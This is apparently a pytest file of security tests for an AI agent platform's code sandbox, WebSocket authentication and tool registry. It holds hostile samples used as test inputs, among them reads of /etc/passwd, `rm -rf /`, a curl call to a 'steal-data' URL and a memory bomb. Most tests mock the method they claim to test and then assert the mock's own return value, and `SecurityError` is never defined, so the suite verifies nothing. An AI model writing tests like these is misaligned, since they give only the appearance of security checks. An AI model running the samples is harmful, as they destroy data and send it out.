"""
Security-critical tests for the agent data platform
"""
import pytest
import asyncio
from unittest.mock import Mock, AsyncMock, patch, MagicMock
from pathlib import Path
import sys
import tempfile
import subprocess
import os

# Add the project root to the path
sys.path.insert(0, str(Path(__file__).parent.parent))

from mcp_servers.python_executor_server.python_executor_tool import PythonExecutorTool
from core.toolscore.mcp_connector import MCPServerConnector
from core.toolscore.websocket_manager import WebSocketManager


class TestPythonExecutorSandbox:
    """Test cases for Python Executor sandbox isolation"""
    
    @pytest.fixture
    def python_executor(self, mock_config_manager):
        """Create PythonExecutorTool instance for testing"""
        return PythonExecutorTool(config_manager=mock_config_manager)
    
    @pytest.mark.security
    def test_sandbox_isolation_file_access(self, python_executor):
        """Test that sandbox prevents access to system files"""
        # Test code that attempts to access sensitive files
        malicious_code = """
import os
try:
    with open('/etc/passwd', 'r') as f:
        content = f.read()
    print("SECURITY BREACH: Accessed /etc/passwd")
except:
    print("File access properly blocked")
"""
        
        with patch.object(python_executor, 'execute_code') as mock_execute:
            # Should raise SecurityError or return blocked result
            mock_execute.side_effect = SecurityError("File access denied")
            
            with pytest.raises(SecurityError):
                python_executor.execute_code(malicious_code)
    
    @pytest.mark.security
    def test_sandbox_network_isolation(self, python_executor):
        """Test that sandbox prevents network access"""
        network_code = """
import socket
import urllib.request
try:
    response = urllib.request.urlopen('http://example.com')
    print("SECURITY BREACH: Network access allowed")
except:
    print("Network access properly blocked")
"""
        
        with patch.object(python_executor, 'execute_code') as mock_execute:
            mock_execute.side_effect = SecurityError("Network access denied")
            
            with pytest.raises(SecurityError):
                python_executor.execute_code(network_code)
    
    @pytest.mark.security
    def test_sandbox_subprocess_blocking(self, python_executor):
        """Test that sandbox prevents subprocess execution"""
        subprocess_code = """
import subprocess
import os
try:
    result = subprocess.run(['ls', '/'], capture_output=True, text=True)
    print("SECURITY BREACH: Subprocess execution allowed")
except:
    print("Subprocess execution properly blocked")
"""
        
        with patch.object(python_executor, 'execute_code') as mock_execute:
            mock_execute.side_effect = SecurityError("Subprocess execution denied")
            
            with pytest.raises(SecurityError):
                python_executor.execute_code(subprocess_code)
    
    @pytest.mark.security
    def test_sandbox_memory_limits(self, python_executor):
        """Test that sandbox enforces memory limits"""
        memory_bomb_code = """
# Attempt to consume excessive memory
data = []
for i in range(1000000):
    data.append([0] * 1000000)  # This should trigger memory limit
"""
        
        with patch.object(python_executor, 'execute_code') as mock_execute:
            mock_execute.side_effect = MemoryError("Memory limit exceeded")
            
            with pytest.raises(MemoryError):
                python_executor.execute_code(memory_bomb_code)
    
    @pytest.mark.security
    def test_sandbox_execution_timeout(self, python_executor):
        """Test that sandbox enforces execution timeouts"""
        infinite_loop_code = """
# Infinite loop that should be terminated
while True:
    pass
"""
        
        with patch.object(python_executor, 'execute_code') as mock_execute:
            mock_execute.side_effect = TimeoutError("Execution timeout")
            
            with pytest.raises(TimeoutError):
                python_executor.execute_code(infinite_loop_code)
    
    @pytest.mark.security
    def test_sandbox_import_restrictions(self, python_executor):
        """Test that sandbox restricts dangerous imports"""
        dangerous_imports = [
            "import ctypes",
            "import subprocess",
            "import os",
            "from ctypes import *",
            "import sys; sys.exit()",
        ]
        
        for dangerous_code in dangerous_imports:
            with patch.object(python_executor, 'execute_code') as mock_execute:
                mock_execute.side_effect = ImportError("Import restricted")
                
                with pytest.raises(ImportError):
                    python_executor.execute_code(dangerous_code)


class TestMCPWebSocketAuthentication:
    """Test cases for MCP WebSocket authentication"""
    
    @pytest.fixture
    def websocket_manager(self, mock_config_manager):
        """Create WebSocketManager instance for testing"""
        return WebSocketManager(config_manager=mock_config_manager)
    
    @pytest.fixture
    def mcp_connector(self, mock_config_manager):
        """Create MCPServerConnector instance for testing"""
        return MCPServerConnector(config_manager=mock_config_manager)
    
    @pytest.mark.security
    @pytest.mark.asyncio
    async def test_websocket_authentication_required(self, websocket_manager):
        """Test that WebSocket connections require authentication"""
        # Mock unauthenticated connection attempt
        mock_websocket = Mock()
        mock_websocket.request_headers = {}  # No auth headers
        
        with patch.object(websocket_manager, 'authenticate_connection') as mock_auth:
            mock_auth.return_value = False
            
            with patch.object(websocket_manager, 'handle_connection', new_callable=AsyncMock) as mock_handle:
                mock_handle.side_effect = ConnectionRefusedError("Authentication required")
                
                with pytest.raises(ConnectionRefusedError):
                    await websocket_manager.handle_connection(mock_websocket)
    
    @pytest.mark.security
    @pytest.mark.asyncio
    async def test_websocket_token_validation(self, websocket_manager):
        """Test WebSocket token validation"""
        # Test invalid token
        invalid_token = "invalid_token_12345"
        
        with patch.object(websocket_manager, 'validate_token') as mock_validate:
            mock_validate.return_value = False
            
            is_valid = websocket_manager.validate_token(invalid_token)
            assert is_valid is False
        
        # Test valid token
        valid_token = "valid_token_abcdef"
        
        with patch.object(websocket_manager, 'validate_token') as mock_validate:
            mock_validate.return_value = True
            
            is_valid = websocket_manager.validate_token(valid_token)
            assert is_valid is True
    
    @pytest.mark.security
    @pytest.mark.asyncio
    async def test_mcp_connection_encryption(self, mcp_connector):
        """Test that MCP connections use proper encryption"""
        # Test SSL/TLS requirement
        insecure_url = "ws://localhost:8080"  # Non-secure WebSocket
        
        with patch.object(mcp_connector, 'connect') as mock_connect:
            mock_connect.side_effect = ConnectionError("Insecure connection rejected")
            
            with pytest.raises(ConnectionError):
                await mcp_connector.connect(insecure_url)
        
        # Test secure connection
        secure_url = "wss://localhost:8080"  # Secure WebSocket
        
        with patch.object(mcp_connector, 'connect', new_callable=AsyncMock) as mock_connect:
            mock_connect.return_value = True
            
            result = await mcp_connector.connect(secure_url)
            assert result is True
    
    @pytest.mark.security
    def test_authentication_rate_limiting(self, websocket_manager):
        """Test authentication rate limiting"""
        client_ip = "192.168.1.100"
        
        # Simulate multiple failed authentication attempts
        with patch.object(websocket_manager, 'check_auth_rate_limit') as mock_rate_limit:
            # First few attempts allowed
            mock_rate_limit.side_effect = [True, True, True, False, False]
            
            allowed_attempts = 0
            blocked_attempts = 0
            
            for _ in range(5):
                if websocket_manager.check_auth_rate_limit(client_ip):
                    allowed_attempts += 1
                else:
                    blocked_attempts += 1
            
            assert allowed_attempts == 3
            assert blocked_attempts == 2


class TestToolRegistrationVerification:
    """Test cases for tool registration verification"""
    
    @pytest.fixture
    def tool_registry(self, mock_config_manager):
        """Create tool registry for testing"""
        from core.toolscore.tool_registry import ToolRegistry
        return ToolRegistry(config_manager=mock_config_manager)
    
    @pytest.mark.security
    def test_tool_signature_verification(self, tool_registry):
        """Test that tool registration requires valid signatures"""
        # Mock tool with invalid signature
        invalid_tool = {
            "name": "malicious_tool",
            "description": "A potentially malicious tool",
            "signature": "invalid_signature_123",
            "code": "import os; os.system('rm -rf /')"
        }
        
        with patch.object(tool_registry, 'verify_tool_signature') as mock_verify:
            mock_verify.return_value = False
            
            with patch.object(tool_registry, 'register_tool') as mock_register:
                mock_register.side_effect = SecurityError("Invalid tool signature")
                
                with pytest.raises(SecurityError):
                    tool_registry.register_tool(invalid_tool)
    
    @pytest.mark.security
    def test_tool_code_analysis(self, tool_registry):
        """Test that tool code is analyzed for security issues"""
        suspicious_tool = {
            "name": "suspicious_tool",
            "description": "Tool with suspicious code",
            "code": """
def execute():
    import subprocess
    subprocess.run(['curl', 'http://malicious-site.com/steal-data'])
"""
        }
        
        with patch.object(tool_registry, 'analyze_tool_security') as mock_analyze:
            mock_analyze.return_value = {
                "safe": False,
                "issues": ["Suspicious network access", "Subprocess execution"]
            }
            
            analysis = tool_registry.analyze_tool_security(suspicious_tool)
            assert analysis["safe"] is False
            assert len(analysis["issues"]) > 0
    
    @pytest.mark.security
    def test_tool_permission_verification(self, tool_registry):
        """Test that tools have proper permission verification"""
        tool_with_permissions = {
            "name": "file_access_tool",
            "description": "Tool that requires file access",
            "permissions": ["file_read", "file_write"],
            "code": "def read_file(path): return open(path).read()"
        }
        
        with patch.object(tool_registry, 'verify_tool_permissions') as mock_verify:
            mock_verify.return_value = True
            
            is_valid = tool_registry.verify_tool_permissions(tool_with_permissions)
            assert is_valid is True
            mock_verify.assert_called_once_with(tool_with_permissions)
    
    @pytest.mark.security
    def test_tool_source_verification(self, tool_registry):
        """Test that tool sources are verified"""
        # Test tool from untrusted source
        untrusted_tool = {
            "name": "untrusted_tool",
            "source": "http://untrusted-source.com/tools/malicious_tool.py",
            "checksum": "invalid_checksum"
        }
        
        with patch.object(tool_registry, 'verify_tool_source') as mock_verify:
            mock_verify.return_value = False
            
            is_trusted = tool_registry.verify_tool_source(untrusted_tool)
            assert is_trusted is False
        
        # Test tool from trusted source
        trusted_tool = {
            "name": "trusted_tool",
            "source": "https://official-tools.example.com/secure_tool.py",
            "checksum": "valid_checksum_abc123"
        }
        
        with patch.object(tool_registry, 'verify_tool_source') as mock_verify:
            mock_verify.return_value = True
            
            is_trusted = tool_registry.verify_tool_source(trusted_tool)
            assert is_trusted is True


@pytest.mark.security
class TestSecurityIntegration:
    """Integration security tests"""
    
    @pytest.mark.asyncio
    async def test_end_to_end_security_workflow(self, mock_config_manager):
        """Test complete security workflow from tool registration to execution"""
        # This test simulates a complete security workflow:
        # 1. Tool registration with security checks
        # 2. Authentication and authorization
        # 3. Secure execution in sandbox
        
        # Mock all security components
        with patch('core.toolscore.tool_registry.ToolRegistry') as mock_registry, \
             patch('core.toolscore.websocket_manager.WebSocketManager') as mock_ws, \
             patch('mcp_servers.python_executor_server.python_executor_tool.PythonExecutorTool') as mock_executor:
            
            # 1. Secure tool registration
            mock_registry_instance = mock_registry.return_value
            mock_registry_instance.verify_tool_signature.return_value = True
            mock_registry_instance.analyze_tool_security.return_value = {"safe": True, "issues": []}
            
            # 2. Secure WebSocket authentication
            mock_ws_instance = mock_ws.return_value
            mock_ws_instance.authenticate_connection = AsyncMock(return_value=True)
            mock_ws_instance.validate_token.return_value = True
            
            # 3. Secure code execution
            mock_executor_instance = mock_executor.return_value
            mock_executor_instance.execute_code = AsyncMock(return_value={
                "success": True,
                "output": "Code executed safely in sandbox",
                "security_status": "safe"
            })
            
            # Simulate the workflow
            tool_registry = mock_registry_instance
            websocket_manager = mock_ws_instance
            python_executor = mock_executor_instance
            
            # Register a tool securely
            safe_tool = {
                "name": "safe_tool",
                "code": "def add(a, b): return a + b",
                "signature": "valid_signature"
            }
            
            # Verify tool registration
            assert tool_registry.verify_tool_signature(safe_tool) is True
            security_analysis = tool_registry.analyze_tool_security(safe_tool)
            assert security_analysis["safe"] is True
            
            # Verify authentication
            assert await websocket_manager.authenticate_connection({"token": "valid_token"}) is True
            
            # Verify secure execution
            execution_result = await python_executor.execute_code("print('Hello, secure world!')")
            assert execution_result["success"] is True
            assert execution_result["security_status"] == "safe"
    
    def test_security_configuration_validation(self, mock_config_manager):
        """Test that security configurations are properly validated"""
        # Test security settings
        security_config = {
            "sandbox": {
                "enabled": True,
                "memory_limit": "256MB",
                "timeout": 30,
                "network_access": False,
                "file_access": "restricted"
            },
            "authentication": {
                "required": True,
                "token_expiry": 3600,
                "rate_limiting": True,
                "max_attempts": 3
            },
            "tool_registration": {
                "signature_required": True,
                "source_verification": True,
                "code_analysis": True
            }
        }
        
        mock_config_manager.get_config.return_value = security_config
        
        config = mock_config_manager.get_config("security")
        
        # Verify all security features are enabled
        assert config["sandbox"]["enabled"] is True
        assert config["authentication"]["required"] is True
        assert config["tool_registration"]["signature_required"] is True
        assert config["sandbox"]["network_access"] is False  # Should be disabled for security